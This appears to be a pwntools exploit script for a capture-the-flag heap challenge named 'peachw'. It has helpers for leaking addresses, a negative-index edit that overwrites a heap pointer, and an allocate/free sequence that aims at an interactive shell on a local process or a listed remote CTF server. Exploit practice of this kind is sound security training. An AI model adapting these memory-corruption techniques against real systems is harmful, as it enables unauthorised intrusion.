# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './peachw'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('./libc-2.26.so')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)

else:
    host = '1.13.162.249'
    port = '10003'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 10)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sa('choice:',num)

def add(idx , size ,name = 'aa',  text = 'bb'):
    cmd(p32(1))
    sla('Index ?',idx)
    sa('peach  :' , name)
    sla('your peach:' , size)
    sa('your peach :' , text)

def errorAdd(idx , size = 0x10 ,name = 'aa'):
    cmd(p32(1))
    sla('Index ?',idx)
    sa('peach  :' , name)
    sla('your peach:' , size)

def delete(idx ):
    cmd(p32(2))
    sla('Index ?',idx)

def edit(idx , size , text):
    cmd(p32(4))
    sla('Index ?',idx)
    sa('your peach : ' , size)
    sa('your peach ' , text)

def leak(idx ):
    cmd(p32(3))
    sla('Index ?',idx)
    sla('number?' , p32(0))

def attack():
    
    # list = $rebase(0x0000000000202180)
    # stack = $rebase(0x0000000000202060)

    sla('peach?' , 'yes\x00'.ljust(0x1c ,'\xff'))
    
    ru('The peach is ')
    low_addr = rint(5)
    lg('low_addr' , low_addr)

    edit( -0x24 , p32(0x300) , 'a'*0x198 + p16(low_addr - 0x60))

    add(0 , 0x410)
    delete(0)
    errorAdd(0)
    delete(0)

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   peachw.py
@Time    :   2022/01/23 13:00:31
@Author  :   Niyah 
''' 